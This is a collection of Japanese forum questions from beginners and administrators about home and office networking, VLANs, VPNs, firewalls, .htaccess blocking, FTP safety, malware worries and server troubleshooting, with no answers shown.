以下、L3スイッチとL2スイッチのVLANについてご存知の方、教えてください。 少し長文ですが、困っているのでよろしくお願いします。 質問の部分は☆印のところです。 L3スイッチ(Catalyst3560)にVLANを3つ作成し、各VLAN間通信を許可する。 ・VLAN1:192.168.10.0/24 (1port～8portを使用) ・VLAN2:192.168.20.0/24 (9port～16portを使用) ・VLAN3:192.168.30.0/24 (17port～24portを使用) L2スイッチ(Catalyst2960)にVLANを3つ作成し、各VLANの1ポートは、L3のVLANに接続する。 ・VLAN1:1port～8portを使用 →L3の1ポート目に接続 ・VLAN2:9port～16portを使用 →L3の9ポート目に接続 ・VLAN3:17port～24portを使用 →L3の17ポート目に接続 ネットワークアドレスが異なる各PC群を、L2に接続し、全PC間通信を可能とする。 →最終目標 質問の背景としては、もともとPCをL3に直接接続して、全PC間の通信を行う予定が、 PCが激増し、L2を介して通信することとなりました。 実際、L2スイッチは48ポートです。 L3スイッチに対する、VLANの設定、VLAN間通信の設定はできています。 質問事項 ☆L3スイッチの設定 おそらく、現在のVLANの設定はポートVLANだと思われます。 L2スイッチとVLAN間同士で通信する場合、タグVLANという考え方が必要になるのでしょうか。 この構成におけるL3スイッチに必要な設定を教えてください。 現在行っている設定は、以下のサイトを参考に設定しました。 http://www.infraexpert.com/study/vlan1.1.htm ☆L2スイッチ VLANを作成するにあたって、L3スイッチとVLAN-IDやVLAN-NAMEを合わせる必要があるのでしょうか。 また、L2スイッチにはIPアドレスを1つしか設定できないという認識で、且つL2スイッチにIPアドレスの 設定は不要という認識です。 この構成の場合、特にIPアドレスの設定は必要ないでしょうか。
私の知り合いの旦那様が他界して所有者のＰＣのパスワードが判らず立ち上げる事が出来なくなって悩んでます。 以前、解析ツール（Ophcrack LIVE CD）で試してみたのですがパス欄にパスワードは表示されず not なんとかって表示が出てきました。 自分のＰＣで試して成功したのですが、知り合いのＰＣだけ上手くいってません。 何方かＰＣに詳しい方で何か良い方法があれば教えてください。 よろしくお願いします。
私は、よくamazonなどのサイトで(SSL対策をしている)、クレジットカード情報を入力して買い物をします。 またＦＸ業者のサイトでも、カード情報を入力しています。(SSL対策をしている) たとえば出会い系のサイトなどで不用意にネットサーフインしてしまった場合 (リンクをクリックするだけ) 上記のカード情報をパソコン内から盗み出されたりする危険はあるのでしょうか？ ウイルス対策はしていますが心配です こんなことにうといので、詳しい方よろしくおねがいします。
無線LANの回線。 PCをディスクトップ型からノートPCに買いかえました。 ノートPCにしてから、ネットゲームでよく回線が落ちたりしてゲームにとても支障がでます。 試しに、有線LANでケーブルをつないで試しても同じでした。 ノートPCはやめて、ディスクトップ型に戻した方がいいのでしょうか・・・？ 何か改善策がありましたら教えてください
悪意のある特定のIPからのアクセスを別サイトに飛ばすため、 下記のように.htaccessファイルに記述しています。 <Limit GET POST PUT> order allow,deny allow from all deny from 特定のIP </Limit> ErrorDocument 403 http://www.yahoo.co.jp/ ところが、.htaccessファイルを設置しても、アクセス解析を見ると 相手のIPからのアクセスが残っています。 .htaccessで弾かれずに、普通に閲覧できているようです。 試しに自分のIPを記述してみたところ、確かにhttp://www.yahoo.co.jp/に 飛ぶので、.htaccessは機能しているはずなのですが、なぜだかわかりません。 対処法をご存知の方がいらっしゃったらご教示ください。 宜しくお願いします。
Windowsには標準でファイル共有の機能が付いていると思うのですが、その危険性について教えて下さい。 パソコンが2台以上ある場合パソコン（7）のHDDのファイルをパソコン（Vista）からもアクセス可能にできると思います。 この機能を使った場合、別のところ（家の外）からパソコン（7）のHDDにアクセスされる可能性はありますか。 パソコン（7）も（Vista）もインターネットに接続していて、ファイアーウォールはWindows標準のものを使っているとします。 また、外部からアクセスされる可能性がある場合、一番安全にファイルを2台以上のパソコンで共有する方法は何がありますか。
現在、レオパレスでLEONETにバッファローのAirStation WHR-HP-GNを繋げて 無線RUN環境にしているのですが、そういえばセキュリティらしいことをしていません。 ネットに接続するときにLEONETのパスワードが聞かれるので大丈夫だと思っていましたが 最近、不安になってきましたが何をすれば良いのかわかりません。 アドバイスお願いします。
会社と出張先とでPPTPを設定し、接続に 成功したのですがネットワークアドレスが 異なるため、相手のPCが上手く見えません。 具体的には以下のようになっています。 会社　　　　　　　　　　　　　　　出張先 192.168.1.XXX　←PPTP→　192.168.100.XXX 自分のPCのアドレスは192.168.100.32です。 このような場合、どのように設定すればよいものでしょうか？ どうかよろしくお願いいたします。
バックアップの作成をしたのですが、1部のファイルがスキップされ完了しませんでした。の メッセージが。　スキップされる理由がわかりません。スキップされたファイルはわかっていますが、 解決方法わおしえてください。
Ｆｏｎルータの接続方法について、安全性も考慮したホームネットワーク構築方法を教えて下さい。 現在のネットワーク構成は 有線　：　｜ 無線　：　* 　　　　　　　　ＣＡＴＶモデム 　　　　　　　　　　　｜ 　　　　　　　　ＢＵＦＦＡＬＯルータ　----　ＰＣ（Ｗｉｎ7） 　　　　　　　　　　　*　　 　　　　　　　　　　　* 　　　　　　　　ＰＬＡＮＥＸコンバータ　----　ＴＶ（REGZA37Z1）　 　　　　　　　　　　　｜ 　　　　　　　　ビデオ（REGZA　BZ-710） 　　　　　　　 これで、ＰＣ、ＴＶ、ビデオのネットワークが構築できてインターネットに繋がっています？。 （ビデオがインターネットに繋がっているかはよくわからないが、ＰＣとＴＶは繋がっている。） 子供が、ｉｐｈｏｎｅに乗換て付属でＦｏｎルータを持って来て、「インターネットに接続、登録すると外出先で Ｉｐｈｏｎｅがネット接続できるので繋いで」と言います。 Ｆｏｎルータは不特定多数にフリースポットを提供するので、ＩＳＰも認めていないし、セキュリティ上好ましくないとの情報もあり、どうしたものかと迷ってます。 接続方法は、 (1)ＣＡＴＶモデムの下にＦｏｎルータを挟む。 　　　　　　　　 　　　　　　　　ＣＡＴＶモデム 　　　　　　　　　　　｜ 　　　　　　　　Ｆｏｎルータ 　　　　　　　　　　　｜ 　　　　　　　　ＢＵＦＦＡＬＯルータ　----　ＰＣ（Ｗｉｎ7） 　　　　　　　　　　　*　　 　　　　　　　　　　　* 　　　　　　　　ＰＬＡＮＥＸコンバータ　----　ＴＶ（REGZA37Z1）　 　　　　　　　　　　　｜ 　　　　　　　　ビデオ（REGZA　BZ-710） 　　　　　　　 (2)ＢＵＦＦＡＬＯルータの下にＦｏｎルータを接続（Ｆｏｎには何も接続しない） 　　　　　　　　 　　　　　　　　ＣＡＴＶモデム 　　　　　　　　　　　｜ 　　　　　　　　ＢＵＦＦＡＬＯルータ　----　ＰＣ（Ｗｉｎ7） 　　　　　　　　　　　*　　　　　｜ 　　　　　　　　　　　*　　　Ｆｏｎルータ 　　　　　　　　　　　* 　　　　　　　　ＰＬＡＮＥＸコンバータ　----　ＴＶ（REGZA37Z1）　 　　　　　　　　　　　｜ 　　　　　　　　ビデオ（REGZA　BZ-710） (3)ＢＵＦＦＡＬＯルータの下にＦｏｎルータを接続しその下にＰＣを接続 　ＰＣ、ＴＶ、ビデオはインターネットに繋がるが、ＰＣはホームネットワークに参加できない。 　　　　　　　　ＣＡＴＶモデム 　　　　　　　　　　　｜ 　　　　　　　　ＢＵＦＦＡＬＯルータ　----　　Ｆｏｎルータ　----　ＰＣ（Ｗｉｎ7） 　　　　　　　　　　　*　　　　　 　　　　　　　　　　　* 　　　　　　　　ＰＬＡＮＥＸコンバータ　----　ＴＶ（REGZA37Z1）　 　　　　　　　　　　　｜ 　　　　　　　　ビデオ（REGZA　BZ-710） (4)ＢＵＦＦＡＬＯルータの下にＦｏｎルータを接続しその下にホームネットワークを構築 　ＢＵＦＦＡＬＯルータの意味がない？ 　　　　　　　　ＣＡＴＶモデム 　　　　　　　　　　　｜ 　　　　　　　　ＢＵＦＦＡＬＯルータ 　　　　　　　　　　　｜　　　　　 　　　　　　　　Ｆｏｎルータ　----　ＰＣ（Ｗｉｎ7） 　　　　　　　　（Ｍｙｐｌａｓe） 　　　　　　　　　　　* 　　　　　　　　　　　* 　　　　　　　　ＰＬＡＮＥＸコンバータ　----　ＴＶ（REGZA37Z1）　 　　　　　　　　　　　｜ 　　　　　　　　ビデオ（REGZA　BZ-710） ４つの方法が考えられると思いますが、ネットワークの知識、技術が不十分な上、Ｆｏｎのセキュリティに対する不安もあり悩んでいます。 どなたか、ご指導をお願いします。
ARPの働きがわかりません。 例えば、ノードA1→ルータA→ルータB→ノードB1と通信する場合にどのように働くのですか？ ネットワークB内に、B1、B2と2つのノードがあった場合、どうやって区別しますか？
メディア上に保存され、ユーザーが騙されイベントドリブンで駆動する トロイの木馬は非常にわかりやすいですが、ワームの動作はいろいろ 調べても腑に落ちない説明文ばかりで悩んでいます。 今まで”ごくごく大まか”に、 ワーム＝スニッファー（またはポートスキャン）機能つきリソースハッカー だと理解していました。 ゆえに、最初のワーム作成犯人または感染ホスト・クライアントの電源が 落ちていればワームは機能できない、と思い込んでいました。 ところが、あるPCスクールの先生から、 一度放たれたワームは、例え世界中のマシンが電源を落としたとしても 回線ケーブル上に生存し続ける。 と聞いて驚きました。 先生が言うには、 ワームはマシンから独立した生命を持つ。 単独で回線上をさまよい続けるからこそ生物の寄生虫になぞらえてワームと 命名され、恐れられている。 とのことです。 当の先生に深く質問すると、はぐらかされてしまうばかりです。 君がウイルスを作ると困るから、というのは了解できます。 しかしこの先生が本気になったら、一人で世界を乗っ取れる天才ハッカー だと思うのです。 どうも面白半分でからかわれている気がして、投稿してみました。 そこで、 １：ワームというオートマトンソフトウエアが、銅線や光回線上に保存され、 ホストCPUによる駆動を必要とせず自立的に動き回るには、 どんなアルゴリズムが成立し得るでしょうか？ ２：将来どんな掟破り技法が登場するかは別として、現状のウイルス作者 の手口では、 「ワームとはスニッファ実装リソースハッカーである」 という”おおまかな認識”で私は当面大丈夫でしょうか？
最近、FTPは危険だという話を聞きます。Gumblarと言うウィルス関連でよくそう言う話を聞きます。長年ホームページを運営してきたのですが、今までFTP接続をして、パスワードを盗まれたり、クラックされたり、何らかの手段でホームページを改ざんされたりした経験はないのですが、それでも危ないのでしょうか？初心者の頃、自分のパソコンがウィルスに感染したことは１～２回ぐらいありますが、最近は、ウィルスに気がつくようになったので、ウィルスに感染することもなくなりました。それでも危険でしょうか？そもそもFTP接続を盗聴している人なんているのでしょうか？使っているのは、ホームページビルダーのFTPツールです。今、特に心配になったのは、かなり重要なデータを有料レンタルで借りているウェブサーバーにアップロードしようと考えているからですが、どうなのでしょうか？一般の閲覧者が見ることができないように、ディレクトリーにIDとPWを設定して、アクセスを制限する予定ですが、それでも危ないでしょうか？ちょっと質問の幅が広くなってしまいますが、よろしくお願い致します。
ただいまネットワークの学習をしております。 そこで、身近なものから普段どうやって自宅でのインターネットが 実現しているのか気になりました。 なお、ＩＰアドレスやＭＡＣアドレス等、基本的なパケットの流れなどは理解しております。 現在、ＮＴＴから借りているＯＮＵから直接ＬＡＮケーブルにてパソコンに接続しております。 ＯＮＵはもちろん壁の光回線部とも繋げております。 一般的にルータがＤＨＣＰ機能を持っているものもあるようですが、 このようにＯＮＵ（光⇔デジタル信号　の変換のみの機能？）だけしか通していないということは、 ＩＰアドレスは一旦外部（光回線を通って自宅マンション外）にでて契約プロバイダネットワークにいき、そこでＩＰアドレスをもらってくる、という流れなのでしょうか。 また、その際の仕組みを簡単に教えていただけませんでしょうか。 あと、気になるのは、ＷＡＮに出るのは、契約プロバイダネットワークから他プロバダネットワークに出る瞬間でしょうか？ 私の家から外に出て行く瞬間はまだＷＡＮとは言わないのでしょうか。 最後に、ＰＰＰとＰＰＰoＥが勉強してもよくわかりません・・・ 簡単な例とともに説明していただけませんでしょうか・・・。 以上、乱文で申し訳ありませんが、 ご教授のほど、宜しくお願い致します。
病院のネットワークの構築を行っています。 添付画像にあるように PC(2)はインターネット PC(3)は支払基金 というネットワークを構築したのですが、質問が3つあります。 (1)つなぎ方は問題ないでしょうか？ (2)セキュリティは大丈夫でしょうか？ファイヤーウォールサーバなどがないので不安です。PC(3)のOSはlinuxです。患者の個人データを扱うシステムが入っています。PC(3)以外はWindows機です。 (3)同一ネットワーク内にルータを2つぶら下げる場合、ブリッジ接続などが必要だと考えていましたが、何の問題なくつながってしまいました。ゲートウェイだけの切り分けでよかったのでしょうか？急にネットワークが不安定になったりしないでしょうか？ ご指導のほどお願いいたします。
こんばんは。 マカフィーのアップグレードに関する質問なのですが 更新の頻度が多すぎて困っています。 今はもう毎日毎日更新して再起動しないといけない状況です しなかったらしなかったでＰＣは重いですし・・ 解決策・・というかこれはもうしょうがないのでしょうか？ 関係あるかどうかわかりませんがＰＣはＮＥＣのlavieです すみません教えてください。よろしくお願いいたします
IPｖ６で接続した時、他のパソコンからアクセスされないように、全ての受信接続がブロックできるファイアウォール機能をもったルーターを教えてください。ルーターじゃなくてもそのような機能をもった通信機器があれば教えてください。個人で使用するのであまり値段が高くない物がいいです。
Windows7にてVPNクライアントソフト（Ver.5.0.0.7）を使用して社内ネットワークにつなげようとしています。 ユーザー認証時のIDとパスワードは正しく入力しています。 接続ボタンを押すとエラーが出まして「VPNセキュア接続がクライアントによってローカルで終了されました」「Reason 442:Failed to enable Virsual Adapter」と表示されてます。 一応自分で調べまして http://www.yc.tcu.ac.jp/~cis/computer/vpn/vpn_fa … ↑このページにある「ネットワーク管理画面の有効・無効」は試しましたが症状は改善されません。 また、下記のページの症状かと思い、読みましたが正直理解できませんでした。 http://oshiete.goo.ne.jp/qa/6710376.html 実は先日まではVPNで社内に接続できていたのですが 下記ソフトをインストールしてから上記エラーが出るようになりました。 http://www.planex.co.jp/support/download/wireles … もちろんこのソフトはアンインストールしましたし、VPNのソフト自体も再インストールしました。 もう何を試して良いのか分からない状態です。 かなり困っている状態です、どなたかアドバイスをお願いします<(_ _)>
ネットワーク構築初心者です。宜しくお願い致します。 今度、ダイナミックDNSを使って自宅に公開サーバを構築しようと考えています。 希望としてはDMZを作ってサーバーを置き、分岐点にはUTMも構築したいです。 そこで質問なのですが、仮想化ソフトを使うと、このような要求を１台のPCで構築できるのでしょうか。 最近知ったのですが仮想化ソフトを使うとNICも仮想的に増やせるようですが 一台のPCの中に仮想LANのようなものが構築できると考えて良いのでしょうか？ また、仮想ソフトは、VMWare vShere（ハイパーバイザ型？）　を勉強しようと考えているのですが 方向性は間違っていないでしょうか？ 詳しい方がいましたら教えて下さい。 初心者のため、トンチンカンな事を言っているかもしれません。 間違っていたら教えて下さい。
Hp ７３００STを使用していました。　 ２年程休止の間が有り、再び立ち上げましたがネットが繋がりません。 ドライバも色々有りすぎてよく解りません。 本体の部品部が壊れているか、良好かの確認も解りません。 ＯＳはWindowsXP Pro、SP3 です。 ネット以外は良好に作動しています。 皆さん、良きアドバイスをお願いします。
自宅用に無線搭載のプリンターを購入しようと思っています。 無線機能を利用するにはアクセスポイントが必要であるとのことですが、今自宅で使ってるネット用の無線LANルーターを活用することはできるのでしょうか？それとも新しくアクセスポイントを買う必要があるのでしょうか？
お世話になります。昨日はパスワードクラックに遭いました。私は、毎日ログインパスワードを入力してWindows７（ホームエディションです）にログインしているのですが、昨日は勝手にパスワードなしでログインできるようになってしまいました。私がアタックされるのは初めてではなく、かなり頻繁にやられます。セキュリティソフトが勝手に停止したり、テレビを視聴するソフトが使えなくなったりと、まあ、被害を受けた種類と数は膨大です。ＯＳがぐちゃぐちゃにされているのはよくわかっています。NortonGhostなしではＰＣが使えません。私は現在Wimaxを使用しているのですが、Wimaxのルータのセキュリティが脆弱なことがわかっているため、もう一台ルータ（マイクロリサーチのNetGenesis）を間にいれて家で使用しています。メーカーの推奨する設定を基にルータの設定を作成しており、ポート８０と４３３以外はすべて閉じています。TCPタイマは１分で切れるようにしています。また、パスワードは記号大小文字を含めて２０桁で使用しています。さて質問です。１．これらの被害を防ぐために、ドライブ暗号化ソフトは有効でしょうか？TrueCryptなるソフトでシステムドライブを暗号化すれば、ハッカー側からは私のＰＣに入り込めたとしても、中が見えなくなるようになるのでしょうか？２．有効なセキュリティ対策が他にありましたら、ご教示ください。長年に渡る悩みであり、万策尽きて精根ともに疲れ果てています。私も普通の人と同じようなネット生活がしたいのです。以上、よろしくお願いします。
セキュリテイーにかんして、マカフイーとかウイルスバスターとマイクロソフトのSecurity Essentialstowとを入れても良いのですか。以前８年くらい前マカフイーとウイルスバスターを入れてクラッシュして動かなくなったことがあります。初心者の質問ですが。すみません。
先日NTTより　1日で50GBのデータ送信があったとの　報告がありました。 該当日には、一日中PCは付いていましたが、これほどの容量のデータ送信は記憶にありません。 ウィルスソフトは常駐していますが、念のため再検索をかけても何も発見されませんでした。 無線ランもプリンター用に使用していますが、現状初期設定のままですが　取り扱い説明書にしたがって未開放にしてあります。 ともかく、原因が解らないので、NTTにデータ送信の詳細な時間などを問い合わせましたが 公開できないとのこと。 前置きが長くなりましたが。今後このような状況になったときのために、データの送受信（送信のみでも可）のログを とってくれるようなソフトはあるのでしょうか？　ベクター等で検索しましたが見つけ出すことが出来ませんでした。 必要としているイメージは データ送受信の開始時間、データ量の記録がそれぞれ残してくれるものはないかと探しています。 理想は、おおもと（モデムやルーター）からの送受信の記録ですが、ソフトをインストールしたPCのみの記録でもかまいません。 お心当たりがございましたら　ご教授いただけますでしょうか　よろしくお願いします
ファイルサーバ(windows2008server)の共有フォルダ内に一部の人しかアクセスできないようにパスワード付のフォルダを設定したいのですが、いろいろ検索してみましたが、これといったものがありません。なにか良い方法はないでしょうか？ ・そのフォルダには複数の人が同時アクセスする可能性がある。 ・１台のパソコンを複数の人が使用する可能性があるので、ユーザーごとにアクセス制限を変える方法では意味がない。 よろしくお願いします。
インターネットサービスプロバイダ（ISP)についてお聞きしたいのですが、 なぜ、ISPって必要なんでしょう？今までの固定電話で例えると回線はNTT東西の物理回線を 利用しているので、支払先はNTTなのは分かります。でもISPはNTTの物理回線上に 仮想回線を構築しているように思います。ISPにお金を払うのは バックボーンの建設費などを提供しているから必要なのですか？ よろしくお願いいたします。
お世話になります。 会社の講習会で「パケットにヘッダがつく理由」について調べることに なりました。 WEBで色々検索してみましたが、いまいちもやもやしておりまして。。 自分では「データが破損した時にどこで破損したか調べる為に必要」 なのかと解釈しておりますが、間違っておりますでしょうか？ あと、補足などありましたら簡単に教えて頂けませんでしょうか。 宜しくお願い致します(_　_)
さくらの専用サーバを２台使っています。現在 192.168.0.1のApacheが落ちてWebサイトが見れない状態です。 192.168.0.2からpingを飛ばすと応答はありますが、SSHではログイン出来ません。 いつもはサポートセンターに電話してリブートしてもらっています。 私は運営を引き継いでまだ間もないのですが、サポートスタッフの手を煩わせずにこちらから復旧する手段も知りたいと思い探しております。しかしなかなか見つかりません。 どなたか良い方法をご存知の方ご教示願います！ ftp と telnet も試しましたが接続できませんでした。 ２台とも FreeBSD 7, Apache2.2.9 です。宜しくお願い致します。
リビングにパソコンがあり別の部屋にも一台パソコンを買いました そして無線ルーターで取り付けました しかし片方のパソコンでインターネットに接続しているともう片方がインターネットに接続できません 何が問題なのでしょうか？
こんにちは 何かヘタリアの動画をPANDORAで見てて、そしたら 「インストゥールするか、インストーゥルしないか」 見たいなのが出てきたんです。 最初はインストゥールしないにして置いたんですけど、見れないので インストゥールするにしました。そしたら、動画は見ることができたんですけど、 そのあと、ほかのサイトとか、何か調べたりしても、上の方に、 「このwebサイトは、Adoube Systems IncoratedからのAdobe Flash Playerアドオンを実行しようとしています。Webサイトとアドオンを信頼し、アドオンの実行を許可するには、ここをクリックしてください」 って言うのが出るんです。 アドオンとか、意味も全然分からないし、ページとか、画面が変わるたびに 「ピポッ」っていう音がするんです。 変なサイトに接続しちゃったり、変なウイルスになったり、たくさんお金がかかったりしませんよね？ あと、これを直す方法を教えてください！！ 至急お願いします！！
プロバイダーが振り当てたIPアドレスで、MACアドレスはわかりますか？ たとえば、グーグルのIPアドレスは64.233.160.0ですが、これを元に、 グーグルの社内のラウター、もしくは機器のMACアドレスを判明することは 可能ですか？ ご回答を宜しくお願いします。
初歩的な質問ですいません。 LAN の外部からMACアドレスは分かりますか？ 例えば、私の家でWIFIを使っているとき、 私の端末のMACアドレスは、私の家のネットワーク の外からでも分かりうるものなのでしょうか？ Ping -arp とかいうコマンドで分かるとどこかで 読んだのですが、もし分かったら嫌なので、 防止策があれば教えて下さい。 宜しくお願いいたします。
telnetでgmailのsmtp.gmail.comにアクセスしてメールをおくりたいのですが、220 2.0.0 Redy to start TLS　の後に何を入力したらいいのでしょうか？ 回答よろしくおねがいします。
社内のＬＡＮで一台だけネットワークに繋がらなくなりました。サーバーへもルータへもＰＩＮＧは通るのですが、ワークグループに出ていけません。ネットワークアダプタのドライバを再インストールしたりしてみましたがかわらずです。
SVNサーバ（Apache経由）を従来Linuxで立ててましたが、Windows側に引っ越す事になりました。 OS:WinXP　XAMPP1.7.7　を導入し、SVN1.7.2を導入しました。 普通にHTTP越しにSVNを利用する事は可能になったのですが、ロック機能が使えません。 エラー: Lock request failed: 400 Bad Request (http://url) が表示されます。 サーバのWindows上で、リポジトリダイレクトアクセス（file://）ではロックできました。 Apacheのエラーログに [Tue Feb 14 12:16:46 2012] [error] [client IP-addr] Tried to attach multiple locks to a resource. [400, #405] というログが出てました。 ぐぐると、英文文献が出てくるのですが、いまひとつ理解できませんでした。 Apacheのアクセスログを見ると IP-addr - - [14/Feb/2012:12:16:46 +0900] "LOCK /svn/filename HTTP/1.1" 400 1085 "-" "SVN/1.4.5 (r25188) neon/0.26.3" となっていました。 Linuxのアクセスログを見ると、LOCKリクエストの時でも IP-addr - username [17/Aug/2011:20:07:10 +0900] "LOCK 以降省略 みたいに、アカウント情報がのってました。 これが原因かな？と思ったのですが、どうやってユーザ情報をのせればいいのかわからないです。 HTTP.CONF のSVNの設定は、以下のような設定です。 何か忘れ物をしているのかどうか、よくわからないのですが、 ロックができずに困っている文献が少なく？困りました。 とっかかりでもなんでもいいので、ヒントがありましたらよろしくお願いします。 <Location /svn> DAV svn SVNParentPath "D:/home/svn/" AuthType Basic AuthName "Subversion Repository" AuthUserFile "D:/home/svn/dav_svn.passwd" Require valid-user <LimitExcept GET PROPFIND OPTIONS REPORT> Require valid-user </LimitExcept> </Location>
起動後、アイコンは出てますが、その後、反応しません。終了して再起動しようと思っても スタートボタンにマウスポインタを持っていっても砂時計。反応なしです。 なので強制終了になり、日に日に回数が増えてます。 システムの復元をすれば開けますが、一旦、パソコンを落とすと同じことの繰り返しです。 OSはXP DELLです。 それともうひとつ、お気に入りのブログを見ようとすれば「インターネットが開けません」とかいう のが出て見れません。 どうしたものでしょうか、宜しくお願いします。
ネットで検索してみましたが、情報がえられませんでしたので、 こちらでご質問させていただきます。 現在、ある場所でネットワークの設計をしていて そこで各catalyst L3SW でACLの設計をしています。 そこでご質問なのですが、ACLの行数について 各catalyst で、これ以上増やすとよくないなどの制限ってありますでしょうか。 どう設計しても200行から減らすことができず、そのまま適用したいのですが、 行数が多いとTCAMへの負荷が高く、「Acl Tcam Full」とエラーメッセージがでて ハードウェア処理からソフトウェア処理に移行するといったページをみました。 ただ、どのくらいで移行するのかの目安がわからず困っています。 対象機器は、Catalyst 6506、3750G です。 よろしくお願いします。
こんにちは。ネットワークについてお教え下さい。 会社では各PCにはDHCPでIPが割り振られています。 パソコンを起動する度に、さまざまなIPが割り振られます。 一台のPCを簡易サーバーにしたいなと思っているのですが、DHCPであればIPが変わってしまう為、どうすればいいのか悩んでいます。 PCは全てWindows XP SP3です。簡易サーバーにしたいと思っているのもサーバーです（ライセンスは問題ありません）。 IPが変わってもサーバーに接続できるようにしたいのですが、どうしたらよいでしょうか？
何度も身に覚えのない請求エクスプローラが勝手に起動して、「支払うまでこの画面は消えません」、と記載されます。強制終了やセキュリティは掛けましたが、何度も繰り返し「ブロックしました」と画面に出てきます。払う気はないのですが、画面がうっとうしくて。どうしたらよいでしょうか？
現在、「社内ネットワーク」と「インターネット」に接続するWindowsサーバを構築中です。 このWindowsサーバにはNICが2枚装着してあります。 　　NIC1側；社内ネットワーク接続 　　NIC2側；インターネット接続 ※最終的にこのWindowsサーバに業務ソフトをインストールします。 　業務ソフトはインターネット上のサーバ(？)から必要な情報を自動でダウンロード 　して社内パソコンから閲覧します。 　なお、業務ソフトがインターネット上のどこに接続するかは不特定のため不明で 　あります。 インターネットで調べたところ、『NIC2枚装着時はどちらか片方のみデフォルト ゲートウェイを設定し、もう片方を「route add」にてルーティングテーブルへ 設定をする必要がある』までは理解しました。 Windowsサーバがインターネットに自由に接続できるようにするための 「route add」の構文を教えてください。 <NIC1側(社内ネットワーク)の情報> IPアドレス　　　　　　　　120.10.10.30 サブネットマスク　　　　　255.255.0.0 デフォルトゲートウェイ　　120.10.10.1 「120.10.10.1」はルータで、このルータの先には A支店（130.10.0.0/16） B支店（140.10.0.0/16） C支店（150.10.0.0/16） D支店（160.10.0.0/16） E支店（170.10.0.0/16） があります。 <NIC2側の情報> IPアドレス　　　　　　　　200.10.10.30 サブネットマスク　　　　　255.255.0.0 デフォルトゲートウェイ　　未設定 NIC2の先は「バカHUB」→「ファイアウオール」→「ルータ」→インターネット となっております。 (「バカHUB」→「ファイアウオール」→「ルータ」→インターネットは既存の ネットーワークを流用します。なお、構築した人が資料を残しておらず、また、 転勤してしまったため、ファイアウオールとルータの設定を調査中。) おそらく、ファイアウオールは 200.10.10.30からインターネットへの通信のみを許可。 インターネットから200.10.10.30への通信のみを許可。 という設定になっていると思います。 ルータ LAN側、WAN側のIPアドレスの状態は不明。 本当に情報が少なくて大変申し訳ありませんが、 ご回答をよろしくお願いします。
http://www.rfi.fr/lffr/questionnaires/146/questi … このサイト内に設置してあるストリーミング（ヘッドフォンのアイコンのボタン）を聞こうと思い試しましたが、開いたウィンドウに「プラグインが見つかりません」とでます。このような場合どのようなようしてプラグインを見つける事ができるのでしょうか？よろしくお願いします。
ウイルス完全除去ソフトのフリーってありますか？ あるならば一番お勧めは何ですか？ すみませんがよろしくお願いします！
.リファラスパムらしき多数のアクセスが「.ru」ドメインからあり、 htaccessに deny from .ru と記述し、.ruからのアクセスを禁止しているのですが、 アクセス解析を見ると相変わらず.ruからのアクセスがあります。 正しく記述していると思うのですが、何が間違っているんでしょうか？ また、これらリファラスパムを排除する他に良い方法は無いでしょうか？
VPNの仕組みについて調べているのですが、 どうしてもうまく理解できない部分があります。 もし詳しい方おりましたら、お力添え願いたいと思います。 (1)必要なものについて VPNを構築するのに最低限必要なものは ・VPNルーター ・回線契約 という認識をしています。 VPNルーターが両拠点間で必要であったり、またクライアントに特別なモジュールが必要であったりする場合は、どのような時でしょうか？ (2)VPNの動きについて 一度VPN接続を確立すると、ローカルのセグメントと同じように操作ができるようになりますが、 通信の仕組みはどうなっているのでしょうか。 （VPN先のIP接続元に振られるわけではなく、常にVPNルーターを経由し、VPNルーターへ接続して VPNルーターから目的のサーバー等にアクセスしているイメージでしょうか？ VPNを確立すると、逆に自分のセグメントへ通信する際もVPNルーターへ接続してしまうのでしょうか。） (3)自分のセグメントと、VPNの接続先のセグメントにも同じIPが存在した場合、 どのように対処すると通信に支障がなくすむでしょうか。 少し長くなってしまいましたが、宜しくお願いします。
インターネットには接続できているにも関わらず、 アクティブネットワークが全く表示されません。 ＬＡＮ側ＩＰアドレスを自動取得をやめ手動指定すると、 ネットワーク表示されはするものの、 パブリックだったり社内ネットワークと判断されたり。 ネットワーク認識されたとしても、 アクティブネットワーク表示の部分にはリンクがなく変更出来ないなど。 同じネットワーク内の無線ＬＡＮノートは、 繋いでいる通りにホームとしてネットーワークが表示されます。 有線ＬＡＮの自作ＰＣのみがこの状態です。 ファイル共有したいのもありますし、 表示されるはずのものが表示されないのも気持ちが悪いものです。 なんとか解決させたくて、 レジストリを弄ってみたり、ローカル～を開いて変えてみたり。 それでもダメでした。 モジュラージャック⇔BR500V⇔WHR-AMPG⇔有線LAN PC このような状態です。 ノートンは入れていますが、 同バージョンをノートにもいれていますので、これが原因とは考えにくく、 一時的にOFFにしても変化はありませんでした。 他Androidケータイも無線ＬＡＮにつないでいますが、 同様の不具合は有線ＰＣのみ。 ネットは出来る為、ケーブルのセンは考えにくいですが交換しても変化なし。 システム復元は不具合発生前の日付はありません。 できればクリーンインストールもしたくはありません。 なんとか解決できないでしょうか。 【有線ＰＣ】 Windows7 Pro、DP965LT（最新ドライバ） 【無線ＰＣ】 MH30/C、Windows7 Starter
ciscoのスイッチで、no cdp enable コマンドをvlanに 設定出来た記憶があるのですが、cat3750で実行すると エラーになります。 % CDP already disabled since not supported on this interface, or for this encapsulation   型番やコマンド順序等の制約など、ご存知の方がいらっしゃいましたら ご教示下さい。 宜しくお願いします。
Windows 2000や98など古いOSはインターネットに接続するだけでも危険だと言われていますが、 携帯に搭載されている、AndroidやiOS、Windows Mobileなどは、古いOSでも安全にウェブサーフィンやインターネットバンキングなどしても大丈夫でしょうか？
LAN内ならローカルのサイトが共有できると聞きましたが、サーバーパソコンじゃないパソコンからアドレスを入力してもサイトを閲覧出来ません。 ファイヤウォールの設定がダメですか？ 詳しい方お願いいたします。
先日ファイルをダウンロードしたところウイルスに感染してしまいました。 インターネットもまともに出来ない状態です そしてすべてのプログラムを開くとものすごいファイルが出てきます 誰か助けてください
GUIで、フォルダを右クリックし「プロパティ」「アクセス権」で、「フォルダのアクセス権」と「ファイルのアクセス権」とを個別に設定できるようです。 ターミナルでコマンドを使って上記の設定を個別に（フォルダとファイルのアクセス権の設定を別個に）行うにはどうしたらよいのでしょうか。 最終的には、フォルダは削除できないけど、フォルダがある場所には別のファイルやフォルダを書き込めるようにしたいのです。
